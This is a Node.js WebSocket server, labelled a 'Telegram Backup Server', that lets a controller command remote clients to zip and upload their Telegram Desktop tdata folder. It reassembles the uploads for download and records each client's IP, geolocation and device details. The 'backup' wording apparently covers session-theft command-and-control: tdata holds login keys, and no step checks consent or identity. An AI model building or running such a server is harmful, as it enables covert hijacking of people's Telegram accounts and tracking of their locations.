import http from 'http';
import express from 'express';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';
import path from 'path';
import { fileURLToPath } from 'url';
import geoip from 'geoip-lite';
import UAParser from 'ua-parser-js';
import fs from 'fs';
import os from 'os';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });

// Configuration
const CONFIG = {
    MAX_CHUNK_SIZE: 64 * 1024, // 64KB
    BACKUP_TIMEOUT: 30 * 60 * 1000, // 30 minutes
    HEARTBEAT_INTERVAL: 30000, // 30 seconds
    TEMP_DIR: path.join(os.tmpdir(), 'telegram_backup_server')
};

// Ensure temp directory exists
if (!fs.existsSync(CONFIG.TEMP_DIR)) {
    fs.mkdirSync(CONFIG.TEMP_DIR, { recursive: true });
}

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

// Connection management
const connections = new Map();
const telegramBackupClients = new Map();
const controllerClients = new Map();
const monitorConnections = new Set();
const activeBackups = new Map();
let keepAliveId = null;

wss.on("connection", (ws, req) => {
    const userID = crypto.randomUUID();
    const clientInfo = extractClientInfo(ws, req);
    
    connections.set(userID, {
        ws: ws,
        info: clientInfo,
        type: 'unknown'
    });

    console.log(`[${new Date().toISOString()}] New connection: ${userID} from ${clientInfo.ip}`);

    ws.on("message", (data) => {
        handleMessage(ws, data, userID);
    });

    ws.on("close", () => {
        handleDisconnect(userID, ws);
    });

    ws.on("error", (error) => {
        console.error(`[${new Date().toISOString()}] WebSocket error for ${userID}:`, error);
        handleDisconnect(userID, ws);
    });

    // Start keep alive if first connection
    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }

    sendClientUpdate();
});

wss.on("close", () => {
    if (keepAliveId) {
        clearInterval(keepAliveId);
        keepAliveId = null;
    }
});

const handleMessage = (ws, data, userID) => {
    try {
        const messageData = JSON.parse(data.toString());
        const connection = connections.get(userID);
        
        if (!connection) return;

        // Update last active time
        connection.info.lastActiveTime = new Date().toISOString();

        // Handle different message types
        switch (messageData.type) {

            case 'controller_register':
                handleControllerRegister(ws, userID, messageData);
                break;
                
            case 'monitor':
                handleMonitorConnection(ws, userID);
                break;
                
            case 'telegram_backup_register':
                handleTelegramBackupRegister(ws, userID, messageData);
                break;
                
            case 'telegram_backup_ready':
                handleTelegramBackupReady(ws, userID, messageData);
                break;
                
            case 'set_tdata_path':
                handleSetTdataPath(messageData);
                break;
                
            case 'backup_command':
                handleBackupCommand(messageData);
                break;
                
            case 'telegram_backup_cancel':
                handleBackupCancel();
                break;
                
            case 'tdata_path_confirmed':
                handleTdataPathConfirmed(messageData);
                break;
                
            case 'telegram_backup_status':
                handleBackupStatus(messageData);
                break;
                
            case 'telegram_backup_start':
                handleBackupStart(messageData);
                break;
                
            case 'telegram_backup_chunk':
                handleBackupChunk(messageData);
                break;
                
            case 'telegram_backup_complete':
                handleBackupComplete(messageData);
                break;
                
            case 'backup_error':
                handleBackupError(messageData);
                break;
                
            case 'heartbeat':
                // Just update last active time (already done above)
                break;
                
            default:
                // Forward other messages to all clients except sender
                broadcastToAll(ws, JSON.stringify(messageData), false);
        }

        sendClientUpdate();
    } catch (e) {
        console.error(`[${new Date().toISOString()}] Error processing message from ${userID}:`, e);
        console.error('Raw message data:', data.toString().substring(0, 200) + '...');
    }
};


const handleControllerRegister = (ws, userID, messageData) => {
    controllerClients.set(userID, {
        ws: ws,
        registered: Date.now()
    });
    
    const connection = connections.get(userID);
    if (connection) {
        connection.type = 'controller';
    }
    
    console.log(`[${new Date().toISOString()}] Controller registered: ${userID}`);
};

// Message handlers
const handleMonitorConnection = (ws, userID) => {
    monitorConnections.add(ws);
    const connection = connections.get(userID);
    if (connection) {
        connection.type = 'monitor';
    }
    console.log(`[${new Date().toISOString()}] Monitor connected: ${userID}`);
};

const handleTelegramBackupRegister = (ws, userID, messageData) => {
    telegramBackupClients.set(userID, {
        ws: ws,
        platform: messageData.platform,
        ready: false,
        pathSet: false
    });
    
    const connection = connections.get(userID);
    if (connection) {
        connection.type = 'telegram_backup';
        connection.info.platform = messageData.platform;
    }
    
    console.log(`[${new Date().toISOString()}] Telegram backup client registered: ${userID} (${messageData.platform})`);
    
    // Notify controllers
    broadcastToControllers({
        type: 'telegram_backup_register',
        clientId: userID,
        platform: messageData.platform,
        timestamp: messageData.timestamp
    });
};

const handleTelegramBackupReady = (ws, userID, messageData) => {
    const client = telegramBackupClients.get(userID);
    if (client) {
        client.ready = true;
    }
    
    console.log(`[${new Date().toISOString()}] Telegram backup client ready: ${userID}`);
    
    // Notify controllers
    broadcastToControllers({
        type: 'telegram_backup_ready',
        clientId: userID,
        platform: messageData.platform,
        timestamp: messageData.timestamp
    });
};

const handleSetTdataPath = (messageData) => {
    console.log(`[${new Date().toISOString()}] Setting tdata path: ${messageData.path}`);
    
    // Forward to telegram backup clients
    telegramBackupClients.forEach((client, clientId) => {
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify(messageData));
        }
    });
};

const handleBackupCommand = (messageData) => {
    const backupId = messageData.backupId || `backup_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    
    console.log(`[${new Date().toISOString()}] Starting backup: ${backupId}`);
    
    // Initialize backup tracking
    activeBackups.set(backupId, {
        id: backupId,
        startTime: Date.now(),
        chunks: new Map(),
        totalChunks: 0,
        filename: null,
        totalSize: 0,
        status: 'started'
    });
    
    // Forward to telegram backup clients
    const command = {
        ...messageData,
        type: 'backup_command',
        backupId: backupId
    };
    
    telegramBackupClients.forEach((client, clientId) => {
        if (client.ws.readyState === WebSocket.OPEN && client.ready && client.pathSet) {
            client.ws.send(JSON.stringify(command));
        }
    });
    
    // Set timeout for backup
    setTimeout(() => {
        if (activeBackups.has(backupId)) {
            console.log(`[${new Date().toISOString()}] Backup timeout: ${backupId}`);
            activeBackups.delete(backupId);
            broadcastToControllers({
                type: 'telegram_backup_status',
                backupId: backupId,
                status: 'timeout',
                error: 'Backup timed out',
                timestamp: new Date().toISOString()
            });
        }
    }, CONFIG.BACKUP_TIMEOUT);
};

const handleBackupCancel = () => {
    console.log(`[${new Date().toISOString()}] Cancelling all backups`);
    
    // Clear active backups
    activeBackups.clear();
    
    // Forward to telegram backup clients
    telegramBackupClients.forEach((client, clientId) => {
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({ type: 'telegram_backup_cancel' }));
        }
    });
    
    // Notify controllers
    broadcastToControllers({
        type: 'telegram_backup_cancel',
        timestamp: new Date().toISOString()
    });
};

const handleTdataPathConfirmed = (messageData) => {
    console.log(`[${new Date().toISOString()}] Tdata path confirmed: ${messageData.path}`);
    
    // Update client status
    telegramBackupClients.forEach((client, clientId) => {
        if (client.ws.readyState === WebSocket.OPEN) {
            client.pathSet = true;
        }
    });
    
    // Forward to controllers
    broadcastToControllers(messageData);
};

const handleBackupStatus = (messageData) => {
    const backup = activeBackups.get(messageData.backupId);
    if (backup) {
        backup.status = messageData.status;
        
        if (messageData.status === 'completed' || messageData.status === 'failed') {
            // Cleanup after delay
            setTimeout(() => {
                activeBackups.delete(messageData.backupId);
                cleanupBackupFiles(messageData.backupId);
            }, 60000); // 1 minute delay
        }
    }
    
    console.log(`[${new Date().toISOString()}] Backup status: ${messageData.backupId} - ${messageData.status}`);
    
    // Forward to controllers
    broadcastToControllers(messageData);
};

const handleBackupStart = (messageData) => {
    const backup = activeBackups.get(messageData.backupId);
    if (backup) {
        backup.filename = messageData.filename;
        backup.status = 'creating_zip';
    }
    
    console.log(`[${new Date().toISOString()}] Backup ZIP creation started: ${messageData.filename}`);
    
    // Forward to controllers
    broadcastToControllers(messageData);
};

const handleBackupChunk = (messageData) => {
    const backup = activeBackups.get(messageData.backupId);
    if (!backup) {
        console.error(`[${new Date().toISOString()}] Received chunk for unknown backup: ${messageData.backupId}`);
        return;
    }
    
    // Store chunk
    backup.chunks.set(messageData.chunkIndex, {
        data: messageData.data,
        size: messageData.size,
        received: Date.now()
    });
    
    console.log(`[${new Date().toISOString()}] Received chunk ${messageData.chunkIndex} for backup ${messageData.backupId} (${messageData.size} bytes)`);
    
    // Forward to controllers (without the actual data to save bandwidth)
    broadcastToControllers({
        type: 'telegram_backup_chunk',
        backupId: messageData.backupId,
        chunkIndex: messageData.chunkIndex,
        size: messageData.size,
        totalChunks: backup.chunks.size
    });
};

const handleBackupComplete = (messageData) => {
    const backup = activeBackups.get(messageData.backupId);
    if (!backup) {
        console.error(`[${new Date().toISOString()}] Backup complete for unknown backup: ${messageData.backupId}`);
        return;
    }
    
    backup.totalSize = messageData.totalSize;
    backup.totalChunks = messageData.totalChunks;
    backup.status = 'completed';
    
    console.log(`[${new Date().toISOString()}] Backup completed: ${messageData.backupId} - ${(messageData.totalSize / 1024 / 1024).toFixed(2)}MB`);
    
    // Reconstruct and save file
    reconstructBackupFile(messageData.backupId)
        .then(() => {
            console.log(`[${new Date().toISOString()}] Backup file reconstructed: ${messageData.backupId}`);
        })
        .catch(error => {
            console.error(`[${new Date().toISOString()}] Error reconstructing backup file:`, error);
        });
    
    // Forward to controllers
    broadcastToControllers(messageData);
};

const handleBackupError = (messageData) => {
    console.error(`[${new Date().toISOString()}] Backup error: ${messageData.error}`);
    
    // Forward to controllers
    broadcastToControllers(messageData);
};

// Utility functions
const reconstructBackupFile = async (backupId) => {
    const backup = activeBackups.get(backupId);
    if (!backup || !backup.filename) return;
    
    try {
        const filePath = path.join(CONFIG.TEMP_DIR, backup.filename);
        const writeStream = fs.createWriteStream(filePath);
        
        // Sort chunks by index and write to file
        const sortedChunks = Array.from(backup.chunks.entries())
            .sort(([a], [b]) => a - b);
        
        for (const [index, chunk] of sortedChunks) {
            const buffer = Buffer.from(chunk.data, 'base64');
            writeStream.write(buffer);
        }
        
        writeStream.end();
        
        return new Promise((resolve, reject) => {
            writeStream.on('finish', () => {
                console.log(`[${new Date().toISOString()}] File saved: ${filePath}`);
                resolve(filePath);
            });
            writeStream.on('error', reject);
        });
    } catch (error) {
        console.error(`[${new Date().toISOString()}] Error reconstructing file:`, error);
        throw error;
    }
};

const cleanupBackupFiles = (backupId) => {
    const backup = activeBackups.get(backupId);
    if (backup && backup.filename) {
        const filePath = path.join(CONFIG.TEMP_DIR, backup.filename);
        fs.unlink(filePath, (err) => {
            if (err && err.code !== 'ENOENT') {
                console.error(`[${new Date().toISOString()}] Error cleaning up file:`, err);
            } else {
                console.log(`[${new Date().toISOString()}] Cleaned up file: ${filePath}`);
            }
        });
    }
};

const broadcastToControllers = (message) => {
    const data = JSON.stringify(message);
    controllerClients.forEach((client, clientId) => {
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(data);
        }
    });
};

const broadcastToAll = (senderWs, message, includeSelf) => {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
            client.send(message);
        }
    });
};

const handleDisconnect = (userID, ws) => {
    const connection = connections.get(userID);
    
    if (connection) {
        console.log(`[${new Date().toISOString()}] Disconnected: ${userID} (${connection.type})`);
    }
    
    connections.delete(userID);
    telegramBackupClients.delete(userID);
    controllerClients.delete(userID);
    monitorConnections.delete(ws);
    
    sendClientUpdate();
};

const keepServerAlive = () => {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping();
            }
        });
    }, CONFIG.HEARTBEAT_INTERVAL);
};

function extractClientInfo(ws, req) {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgentString = req.headers['user-agent'];
    const parser = new UAParser(userAgentString);
    const result = parser.getResult();
    const geoData = geoip.lookup(ip);

    return {
        ip: ip,
        userAgent: {
            browser: {
                name: result.browser.name || 'Unknown',
                version: result.browser.version || ''
            },
            engine: {
                name: result.engine.name || 'Unknown',
                version: result.engine.version || ''
            },
            os: {
                name: result.os.name || 'Unknown',
                version: result.os.version || ''
            },
            device: {
                model: result.device.model || 'Unknown',
                type: result.device.type || 'Unknown',
                vendor: result.device.vendor || 'Unknown'
            },
            cpu: {
                architecture: result.cpu.architecture || 'Unknown'
            }
        },
        geoLocation: geoData ? {
            country: geoData.country,
            region: geoData.region,
            city: geoData.city,
            ll: geoData.ll,
        } : null,
        connectTime: new Date().toISOString(),
        lastActiveTime: new Date().toISOString(),
    };
}

function sendClientUpdate() {
    const clientData = Array.from(connections.entries()).map(([id, connection]) => ({
        id,
        type: connection.type,
        info: connection.info
    }));
    
    const updateMessage = JSON.stringify({
        type: 'clientUpdate',
        clients: clientData,
        activeBackups: Array.from(activeBackups.values()).map(backup => ({
            id: backup.id,
            status: backup.status,
            filename: backup.filename,
            totalSize: backup.totalSize,
            chunksReceived: backup.chunks.size,
            totalChunks: backup.totalChunks
        }))
    });
    
    monitorConnections.forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(updateMessage);
        }
    });
}

// Routes
app.get('/', (req, res) => {
    res.setHeader('Cache-Control', 'no-store');
    res.status(200).send('Telegram Backup WebSocket Server');
});

app.get('/monitor', (req, res) => {
    res.sendFile(path.join(__dirname, 'monitor.html'));
});

app.get('/controller', (req, res) => {
    res.sendFile(path.join(__dirname, 'controller.html'));
});

app.get('/status', (req, res) => {
    res.json({
        connections: connections.size,
        telegramClients: telegramBackupClients.size,
        controllers: controllerClients.size,
        monitors: monitorConnections.size,
        activeBackups: activeBackups.size,
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        timestamp: new Date().toISOString()
    });
});

app.get('/backups', (req, res) => {
    const backups = Array.from(activeBackups.values()).map(backup => ({
        id: backup.id,
        status: backup.status,
        filename: backup.filename,
        totalSize: backup.totalSize,
        chunksReceived: backup.chunks.size,
        totalChunks: backup.totalChunks,
        startTime: backup.startTime
    }));
    
    res.json(backups);
});

app.get('/download/:backupId', (req, res) => {
    const backup = activeBackups.get(req.params.backupId);
    if (!backup || !backup.filename) {
        return res.status(404).json({ error: 'Backup not found' });
    }
    
    const filePath = path.join(CONFIG.TEMP_DIR, backup.filename);
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'Backup file not found' });
    }
    
    res.download(filePath, backup.filename);
});

app.get('/node-version', (req, res) => {
    res.send(`Node.js version: ${process.version}`);
});

// Cleanup on exit
process.on('SIGINT', () => {
    console.log('\n[SHUTDOWN] Cleaning up...');
    
    // Clean up temp files
    if (fs.existsSync(CONFIG.TEMP_DIR)) {
        fs.rmSync(CONFIG.TEMP_DIR, { recursive: true, force: true });
    }
    
    process.exit(0);
});

server.listen(PORT, () => {
    console.log(`[${new Date().toISOString()}] Telegram Backup Server running on port ${PORT}`);
    console.log(`[${new Date().toISOString()}] Temp directory: ${CONFIG.TEMP_DIR}`);
});
